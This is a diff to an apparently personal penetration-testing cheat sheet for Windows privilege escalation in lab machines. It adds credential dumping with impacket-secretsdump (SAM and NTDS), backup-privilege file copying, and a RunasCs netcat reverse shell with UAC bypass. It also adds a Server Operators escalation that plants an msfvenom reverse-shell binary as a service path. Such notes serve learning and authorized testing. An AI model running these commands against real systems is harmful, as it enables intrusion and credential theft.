@@ -101,6 +101,11 @@ The operation completed successfully.
 *Evil-WinRM* PS C:\users\anirudh> reg save hklm\system ./system
 The operation completed successfully.
 ```
+- rocopy with the backup privilege
+
+```
+robocopy C:\users\administrator\desktop c:\users root.txt /B
+```
 
 - download to kali machine
 
@@ -113,10 +118,16 @@ Info: Downloading C:\users\anirudh\system to system
 Info: Download successful!
 ```
 
-- extract credentials
+- extract local credentials
 
 ```sh
 impacket-secretsdump -system system -sam sam local                             
+```
+
+- extract domain credentials
+
+```sh
+impacket-secretsdump -system system -ntds ntds.dit local
 ```
 
 ### SeRestorePrivilege
@@ -465,6 +476,12 @@ cd reports
 git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git
 ```
 
+## evilwin-rm
+
+- `services` : display running sc.exe services
+- `upload` : upload a file
+- `download` : download a file
+
 ## runascs
 
 - run as other users in windows
@@ -473,3 +490,14 @@ git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ell
 ```
 ./RunasCs.exe admin Twisting3021 "C:\temp\nc64.exe 10.10.14.61 1234 -e cmd.exe" -bypass-uac
 ```
+
+## Privileged groups
+
+- check with `whoami /group`
+
+### server operator group
+
+1. check running services. `services` command in case of evilwin-rm.
+2. create a rev shell file using msfvenom. `msfvenom -p windows/x64/shell_reverse_tcp -f exe -o rev.exe LHOST=10.10.15.99 LPORT=4444`
+3. change the binary path of any target service. `sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\rev.exe"`
+4. restart the service. `sc.exe stop VMTools` `sc.exe start VMTools`
